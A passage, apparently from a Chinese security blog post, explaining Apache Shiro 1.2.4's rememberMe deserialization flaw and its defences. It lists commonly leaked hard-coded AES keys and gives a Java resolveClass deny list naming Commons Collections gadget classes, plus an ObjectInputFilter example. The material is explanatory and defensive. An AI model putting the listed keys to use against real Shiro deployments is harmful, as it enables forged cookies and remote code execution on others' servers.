![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028210935.png)

`shiro-core-1.2.4-sources.jar!/org/apache/shiro/io/DefaultSerializer.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028211030.png)

下面是加密过程：

`shiro-core-1.2.4-sources.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028212505.png)

首先将对象进行序列化，将序列化后的数据进行加密，加密方式是AES-CBC：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028214605.png)

`shiro-core-1.2.4-sources.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028214728.png)

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028214803.png)

key是写死在代码里的，只要key被泄漏，shiro就有反序列化漏洞的风险。

附上常见的shiro密钥，来自[Generate all unserialize payload via serialVersionUID](http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/)：

```
4AvVhmFLUs0KTA3Kprsdag==    :   190
3AvVhmFLUs0KTA3Kprsdag==    :   157
Z3VucwAAAAAAAAAAAAAAAA==    :   135
2AvVhdsgUs0FSA3SDFAdag==    :   114
wGiHplamyXlVB11UXWol8g==    :   35
kPH+bIxk5D2deZiIxcaaaA==    :   27
fCq+/xW488hMTCD+cmJ3aQ==    :   9
1QWLxg+NYmxraMoxAXu/Iw==    :   9
ZUdsaGJuSmxibVI2ZHc9PQ==    :   8
L7RioUULEFhRyxM7a2R/Yg==    :   5
6ZmI6I2j5Y+R5aSn5ZOlAA==    :   5
r0e3c16IdVkouZgk1TKVMg==    :   4
ZWvohmPdUsAWT3=KpPqda       :   4
5aaC5qKm5oqA5pyvAAAAAA==    :   4
bWluZS1hc3NldC1rZXk6QQ==    :   3
a2VlcE9uR29pbmdBbmRGaQ==    :   3
WcfHGU25gNnTxTlmJMeSpw==    :   3
LEGEND-CAMPUS-CIPHERKEY==   :   3
3AvVhmFLUs0KTA3Kprsdag ==   :   3
```

## 0x02 漏洞防御

### 黑白名单

在readObject反序列化时首先会调用resolveClass读取反序列化的类名，可以通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。

```java
package cn.seaii.vulnjsm.utils;

import java.io.*;

public class AntObjectInputStream extends ObjectInputStream {
    public AntObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName(); //获取反序列化类的类名
        String[] denyClasses = {
                "java.net.InetAddress",
                "org.apache.commons.collections.Transformer",
                "org.apache.commons.collections.functors",
        }; //设置黑名单，可以参考ysoserial的gadget
        for (String denyClass : denyClasses) {
            if (className.startsWith(denyClass)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }
        return super.resolveClass(desc);
    }
}
```

第三方扩展：

[https://github.com/ikkisoft/SerialKiller](https://github.com/ikkisoft/SerialKiller)

[https://github.com/Contrast-Security-OSS/contrast-rO0](https://github.com/Contrast-Security-OSS/contrast-rO0)

Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承[java.io.ObjectInputFilter](http://download.java.net/java/jdk9/docs/api/java/io/ObjectInputFilter.html)类重写checkInput方法实现自定义的过滤器，并使用ObjectInputStream对象的[setObjectInputFilter](http://download.java.net/java/jdk9/docs/api/java/io/ObjectInputStream.html#setObjectInputFilter-java.io.ObjectInputFilter-)设置过滤器来实现反序列化类白/黑名单控制。

```java
import java.util.List;
import java.util.Optional;
import java.util.function.Function;
import java.io.ObjectInputFilter;

class BikeFilter implements ObjectInputFilter {
    private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.
    private long maxDepth = 1; // Maximum depth of the graph allowed.
    private long maxReferences = 1; // Maximum number of references in a graph.
    
  	@Override
    public Status checkInput(FilterInfo filterInfo) {
      	if (filterInfo.references() < 0 || 
          filterInfo.depth() < 0 || 
          filterInfo.streamBytes() < 0 || 
          filterInfo.references() > maxReferences || 
          filterInfo.depth() > maxDepth || 
          filterInfo.streamBytes() > maxStreamBytes
      	) {
        		return Status.REJECTED;
      	}
      	Class<?> clazz = filterInfo.serialClass();
      	if (clazz != null) {
            if (SerialObject.class == filterInfo.serialClass()) {
                return Status.ALLOWED;
            } else {
                return Status.REJECTED;
            }
      	}
      	return Status.UNDECIDED;
		} // end checkInput
} // end class BikeFilter
```

### 将输入内容进行编码

将输入的内容用用户无法猜测的方式进行编码或对称加密然后再发送到后端，但是在哪一步加密是一个问题，如果在前端，就有加密算法被破解的风险。

### 禁止用户输入反序列化数据

受实际业务需求的影响非常大，不能作为一种通用的修复手段。由此看来，黑白名单仍然是最常用的防御手段。

## 0x03 参考链接

[Java 反序列化漏洞始末（1）— Apache Commons](https://bithack.io/forum/419)

[浅析Java序列化和反序列化](https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247484038&idx=1&sn=0c1509ed5878d0aea786348acce0e895)

[https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md](https://github.com/Cryin/Paper/blob/master/浅谈Java反序列化漏洞修复方案.md)

[Java反序列 Jdk7u21 Payload 学习笔记](https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/)

[FastJson反序列化的前世今生](https://p0sec.net/index.php/archives/123/)

[java反序列化RCE回显研究](https://xz.aliyun.com/t/5257)